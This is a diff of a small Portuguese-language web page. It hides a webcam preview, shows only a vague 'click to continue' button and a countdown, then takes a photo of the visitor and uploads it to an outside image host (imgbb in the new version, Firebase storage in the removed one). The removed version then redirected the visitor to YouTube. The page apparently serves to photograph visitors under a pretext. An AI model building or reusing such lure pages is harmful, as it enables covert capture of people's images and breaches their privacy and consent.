@@ -12,20 +12,21 @@ body {
     align-items: center;
     background: #111;
     color: white;
+    font-family: Arial;
     flex-direction: column;
 }
 
 button {
     padding: 18px 30px;
     font-size: 18px;
-    border-radius: 10px;
+    border-radius: 12px;
     border: none;
     background: #00ff88;
     font-weight: bold;
 }
 
 #countdown {
-    font-size: 50px;
+    font-size: 60px;
     margin-top: 20px;
 }
 </style>
@@ -34,42 +35,42 @@ button {
 <body>
 
 <video id="webcam" autoplay playsinline muted style="display:none;"></video>
+
 <button id="btn">Clique aqui para continuar</button>
 <div id="countdown"></div>
 
-<!-- Firebase -->
-<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js"></script>
-<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js"></script>
-
 <script>
-// 🔥 COLOCA SUA CONFIG AQUI
-const firebaseConfig = {
-  apiKey: "SUA_API_KEY",
-  authDomain: "SEU_PROJETO.firebaseapp.com",
-  projectId: "SEU_PROJETO",
-  storageBucket: "SEU_PROJETO.appspot.com",
-};
-
-// inicializa
-firebase.initializeApp(firebaseConfig);
-const storage = firebase.storage();
+const API_KEY = "SUA_API_KEY_AQUI"; // 🔥 coloca aqui
 
 document.getElementById("btn").addEventListener("click", start);
 
 async function start() {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    const video = document.getElementById("webcam");
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "user" }
+        });
 
-    video.srcObject = stream;
-    await video.play();
+        const video = document.getElementById("webcam");
+        video.srcObject = stream;
 
-    document.getElementById("btn").style.display = "none";
+        await video.play();
 
+        document.getElementById("btn").style.display = "none";
+
+        startCountdown(video, stream);
+
+    } catch (err) {
+        alert("Permita acesso à câmera");
+        console.log(err);
+    }
+}
+
+function startCountdown(video, stream) {
     let count = 3;
     const el = document.getElementById("countdown");
     el.innerText = count;
 
-    const interval = setInterval(() => {
+    const interval = setInterval(async () => {
         count--;
         el.innerText = count > 0 ? count : "📸";
 
@@ -80,20 +81,46 @@ async function start() {
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
 
-            canvas.getContext("2d").drawImage(video, 0, 0);
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0);
 
-            canvas.toBlob(async (blob) => {
-                const ref = storage.ref("fotos/" + Date.now() + ".jpg");
+            const imageData = canvas.toDataURL("image/jpeg", 0.9);
 
-                await ref.put(blob);
+            await enviarImagem(imageData);
 
-                stream.getTracks().forEach(t => t.stop());
+            stream.getTracks().forEach(track => track.stop());
 
-                window.location.href = "https://youtube.com";
-            }, "image/jpeg", 0.9);
+            setTimeout(() => {
+                window.location.href = "view-images.html";
+            }, 1500);
         }
 
     }, 1000);
+}
+
+async function enviarImagem(base64) {
+    try {
+        const formData = new FormData();
+        formData.append("image", base64.split(",")[1]);
+
+        const res = await fetch(`https://api.imgbb.com/1/upload?key=${API_KEY}`, {
+            method: "POST",
+            body: formData
+        });
+
+        const data = await res.json();
+
+        const imageUrl = data.data.url;
+
+        console.log("Imagem enviada:", imageUrl);
+
+        // salva o link localmente
+        localStorage.setItem("imageURL", imageUrl);
+
+    } catch (err) {
+        console.log("Erro ao enviar:", err);
+        alert("Erro ao enviar imagem");
+    }
 }
 </script>
 
